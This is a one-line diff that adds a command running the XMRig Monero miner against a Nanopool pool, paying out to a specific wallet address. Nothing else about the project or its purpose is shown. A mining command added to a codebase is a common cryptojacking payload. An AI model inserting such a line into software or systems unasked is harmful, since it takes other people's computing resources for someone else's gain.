@@ -1,0 +1,1 @@
+./xmrig --donate-level 2 -o xmr-asia1.nanopool.org:14433 -u 8BAzJgTy6scZHb8cLRX8dbGZdHHBjBLro4FvxXSQmB3Hch3UmwzZ4Y7STZdcTjG5yrKk5zt1YA3N96GnrDdryK32CyKnAoU --tls --coin monero
